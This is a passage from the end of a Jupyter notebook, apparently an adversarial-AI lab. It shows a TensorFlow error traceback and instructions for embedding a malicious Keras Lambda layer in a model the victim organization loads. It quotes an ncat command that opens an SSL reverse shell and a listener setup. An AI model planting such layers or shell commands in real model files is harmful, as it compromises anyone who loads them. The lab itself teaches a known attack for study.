      "2025-08-01 20:42:34.236315: W tensorflow/compiler/mlir/tools/kernel_gen/tf_gpu_runtime_wrappers.cc:40] 'cuModuleGetFunction(&function, module, kernel_name)' failed with 'CUDA_ERROR_INVALID_HANDLE'\n",
      "\n",
      "2025-08-01 20:42:34.236420: W tensorflow/core/framework/op_kernel.cc:1844] INTERNAL: 'cuLaunchKernel(function, gridX, gridY, gridZ, blockX, blockY, blockZ, 0, reinterpret_cast<CUstream>(stream), params, nullptr)' failed with 'CUDA_ERROR_INVALID_HANDLE'\n",
      "2025-08-01 20:42:34.236516: I tensorflow/core/framework/local_rendezvous.cc:407] Local rendezvous is aborting with status: INTERNAL: 'cuLaunchKernel(function, gridX, gridY, gridZ, blockX, blockY, blockZ, 0, reinterpret_cast<CUstream>(stream), params, nullptr)' failed with 'CUDA_ERROR_INVALID_HANDLE'\n",
      "Traceback (most recent call last):\n",
      "  File \"/mnt/d/Little Book on Adversarial AI/labs/tf_make_predictions_base_script.py\", line 62, in <module>\n",
      "    loaded_model = tf.keras.models.load_model(filepath=cmd_args.model)\n",
      "                   ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n",
      "  File \"/home/securitynik/miniconda3/envs/adversarial_ai/lib/python3.12/site-packages/keras/src/saving/saving_api.py\", line 189, in load_model\n",
      "    return saving_lib.load_model(\n",
      "           ^^^^^^^^^^^^^^^^^^^^^^\n",
      "  File \"/home/securitynik/miniconda3/envs/adversarial_ai/lib/python3.12/site-packages/keras/src/saving/saving_lib.py\", line 370, in load_model\n",
      "    return _load_model_from_fileobj(\n",
      "           ^^^^^^^^^^^^^^^^^^^^^^^^^\n",
      "  File \"/home/securitynik/miniconda3/envs/adversarial_ai/lib/python3.12/site-packages/keras/src/saving/saving_lib.py\", line 447, in _load_model_from_fileobj\n",
      "    model = _model_from_config(\n",
      "            ^^^^^^^^^^^^^^^^^^^\n",
      "  File \"/home/securitynik/miniconda3/envs/adversarial_ai/lib/python3.12/site-packages/keras/src/saving/saving_lib.py\", line 436, in _model_from_config\n",
      "    model = deserialize_keras_object(\n",
      "            ^^^^^^^^^^^^^^^^^^^^^^^^^\n",
      "  File \"/home/securitynik/miniconda3/envs/adversarial_ai/lib/python3.12/site-packages/keras/src/saving/serialization_lib.py\", line 718, in deserialize_keras_object\n",
      "    instance = cls.from_config(inner_config)\n",
      "               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n",
      "  File \"/home/securitynik/miniconda3/envs/adversarial_ai/lib/python3.12/site-packages/keras/src/models/sequential.py\", line 371, in from_config\n",
      "    layer = serialization_lib.deserialize_keras_object(\n",
      "            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n",
      "  File \"/home/securitynik/miniconda3/envs/adversarial_ai/lib/python3.12/site-packages/keras/src/saving/serialization_lib.py\", line 730, in deserialize_keras_object\n",
      "    instance.build_from_config(build_config)\n",
      "  File \"/home/securitynik/miniconda3/envs/adversarial_ai/lib/python3.12/site-packages/keras/src/layers/layer.py\", line 481, in build_from_config\n",
      "    self.build(config[\"input_shape\"])\n",
      "  File \"/home/securitynik/miniconda3/envs/adversarial_ai/lib/python3.12/site-packages/keras/src/layers/layer.py\", line 232, in build_wrapper\n",
      "    original_build_method(*args, **kwargs)\n",
      "  File \"/home/securitynik/miniconda3/envs/adversarial_ai/lib/python3.12/site-packages/keras/src/layers/core/dense.py\", line 116, in build\n",
      "    self._kernel = self.add_weight(\n",
      "                   ^^^^^^^^^^^^^^^^\n",
      "  File \"/home/securitynik/miniconda3/envs/adversarial_ai/lib/python3.12/site-packages/keras/src/layers/layer.py\", line 575, in add_weight\n",
      "    variable = backend.Variable(\n",
      "               ^^^^^^^^^^^^^^^^^\n",
      "  File \"/home/securitynik/miniconda3/envs/adversarial_ai/lib/python3.12/site-packages/keras/src/backend/common/variables.py\", line 206, in __init__\n",
      "    self._initialize_with_initializer(initializer)\n",
      "  File \"/home/securitynik/miniconda3/envs/adversarial_ai/lib/python3.12/site-packages/keras/src/backend/tensorflow/core.py\", line 52, in _initialize_with_initializer\n",
      "    self._initialize(lambda: initializer(self._shape, dtype=self._dtype))\n",
      "  File \"/home/securitynik/miniconda3/envs/adversarial_ai/lib/python3.12/site-packages/keras/src/backend/tensorflow/core.py\", line 42, in _initialize\n",
      "    self._value = tf.Variable(\n",
      "                  ^^^^^^^^^^^^\n",
      "  File \"/home/securitynik/miniconda3/envs/adversarial_ai/lib/python3.12/site-packages/tensorflow/python/util/traceback_utils.py\", line 153, in error_handler\n",
      "    raise e.with_traceback(filtered_tb) from None\n",
      "  File \"/home/securitynik/miniconda3/envs/adversarial_ai/lib/python3.12/site-packages/keras/src/backend/tensorflow/core.py\", line 52, in <lambda>\n",
      "    self._initialize(lambda: initializer(self._shape, dtype=self._dtype))\n",
      "                             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n",
      "  File \"/home/securitynik/miniconda3/envs/adversarial_ai/lib/python3.12/site-packages/keras/src/initializers/random_initializers.py\", line 306, in __call__\n",
      "    return random.uniform(\n",
      "           ^^^^^^^^^^^^^^^\n",
      "  File \"/home/securitynik/miniconda3/envs/adversarial_ai/lib/python3.12/site-packages/keras/src/backend/tensorflow/random.py\", line 33, in uniform\n",
      "    seed = _cast_seed(draw_seed(seed))\n",
      "                      ^^^^^^^^^^^^^^^\n",
      "  File \"/home/securitynik/miniconda3/envs/adversarial_ai/lib/python3.12/site-packages/keras/src/random/seed_generator.py\", line 154, in draw_seed\n",
      "    return convert_to_tensor([seed, 0], dtype=random_seed_dtype())\n",
      "           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n",
      "  File \"/home/securitynik/miniconda3/envs/adversarial_ai/lib/python3.12/site-packages/keras/src/backend/tensorflow/core.py\", line 152, in convert_to_tensor\n",
      "    return tf.cast(x, dtype)\n",
      "           ^^^^^^^^^^^^^^^^^\n",
      "tensorflow.python.framework.errors_impl.InternalError: {{function_node __wrapped__Cast_device_/job:localhost/replica:0/task:0/device:GPU:0}} 'cuLaunchKernel(function, gridX, gridY, gridZ, blockX, blockY, blockZ, 0, reinterpret_cast<CUstream>(stream), params, nullptr)' failed with 'CUDA_ERROR_INVALID_HANDLE' [Op:Cast] name: \n"
     ]
    }
   ],
   "source": [
    "# The base script which the organization uses to make predictions is **tf_make_predictions_base_script.py**\n",
    "# Note! Copy this to a python file and run it from the command line.\n",
    "# Let's say we gain access to the script file:\n",
    "# tf_make_predictions_base_script.py\n",
    "\n",
    "# Open a terminal and run the script\n",
    "# Do not run it from within this notebook\n",
    "# It will still give you the error but this is not what we want\n",
    "# The organization is more than likely not running their code through Jupiter but instead as a script outside of Jupiter\n",
    "# when the organization tries to run our model, it will fail\n",
    "!python3 tf_make_predictions_base_script.py --model /tmp/zeek_pwnd.keras --data \"[[0.5, 0.2, 0.1, 0.3, 0.4, 0.2, 0.5]]\""
   ]
  },
  {
   "cell_type": "markdown",
   "id": "daa17128",
   "metadata": {},
   "source": [
    "### Now that's a big red flag!  \n",
    "Let us now modify the organization base script  \n",
    "We will give the modified script a different name\n",
    "All we need to do, is copy our malicious function into the script and modify the arguments if we wish.   \n",
    "\n",
    "We will do it two ways. Let's us set a default argument that allows it to setup a reverse shell and the second way, allows us to run any command we want via the model    \n",
    "\n",
    "- Remember to setup your listener on your remote host before running this script\n",
    "**ncat --verbose --listen 9999 --ssl**\n",
    "\n",
    "\n",
    "- Not sure if you remember, but if you scroll up, you will see this line above. \n",
    "**malicious_layer = tf.keras.layers.Lambda(function=malicious_payload, name='malicious_layer', arguments={'command' : 'ncat --verbose 127.0.0.1 9999 --exec /bin/sh --ssl &'})**\n",
    "\n",
    "That is the line we will use \n",
    "\n",
    "Now let's make a copy of the base script:  \n",
    "**Note: This file is already there for you. If you are copying give your new script a new name**\n",
    "cp ./tf_make_predictions_base_script.py ./tf_make_predictions_pwnd_script_lambda.py -v   \n",
    "\n",
    "### Transitioning to lab:  \n",
    "**Attacking_Lambda_Layers_cmd.ipynb** "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3dc7caea",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "adversarial_ai",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.11"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
